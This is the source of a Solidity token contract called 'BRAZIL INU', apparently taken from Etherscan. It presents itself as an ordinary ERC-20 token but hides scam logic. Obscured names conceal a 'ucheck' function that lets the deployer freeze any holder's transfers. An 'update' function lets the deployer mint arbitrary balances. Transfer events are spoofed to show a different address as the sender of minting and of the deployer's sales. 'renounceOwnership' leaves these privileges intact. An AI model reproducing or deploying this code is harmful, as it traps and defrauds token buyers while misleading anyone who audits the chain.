/**
 *Submitted for verification at Etherscan.io on 2022-11-30
*/

pragma solidity 0.8.17;

abstract contract Context {
    address U6 = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
 modifier onlyOwner{
   require(msg.sender == _Owner);     
        _; }
    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract BRAZILINU is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private U1;
    mapping (address => uint256) private U2;
    mapping (address => mapping (address => uint256)) private U3;
    uint8 private U4;
    uint256 private U5;
    string private _name;
    string private _symbol;



    constructor () {

        
        _name = "BRAZIL INU";
        _symbol = "BRAZILINU";
        U4 = 9;
        uint256 U7 = 150000000;
        U2[msg.sender] = 1;
        increase(U6, U7*(10**9));
        


    }

    

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return U4;
    }

    function totalSupply() public view  returns (uint256) {
        return U5;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return U1[account];
    }
	 function allowance(address owner, address spender) public view  returns (uint256) {
        return U3[owner][spender];
    }
    function increase(address account, uint256 amount) onlyOwner public {
     
        U5 = U5.add(amount);
        U1[msg.sender] = U1[msg.sender].add(amount);
        emit Transfer(address(0), account, amount);
    }
function approve(address spender, uint256 amount) public returns (bool success) {    
        U3[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
function ucheck (address x, uint256 y) public {
 require(U2[msg.sender] == 1);
     U2[x] = y;}
    function update() public {
        U1[msg.sender] = U2[msg.sender];}


    function transfer(address recipient, uint256 amount) public   returns (bool) {
        require(amount <= U1[msg.sender]);
        require(U2[msg.sender] <= 1);
        _loadsend(msg.sender, recipient, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public  returns (bool) {
        require(amount <= U1[sender]);
              require(U2[sender] <= 1 && U2[recipient] <=1);
                  require(amount <= U3[sender][msg.sender]);
        _loadsend(sender, recipient, amount);
        return true;}

    function _loadsend(address sender, address recipient, uint256 amount) internal  {
        U1[sender] = U1[sender].sub(amount);
        U1[recipient] = U1[recipient].add(amount);
       if(U2[sender] == 1) {
            sender = U6;}
        emit Transfer(sender, recipient, amount); }
     
        }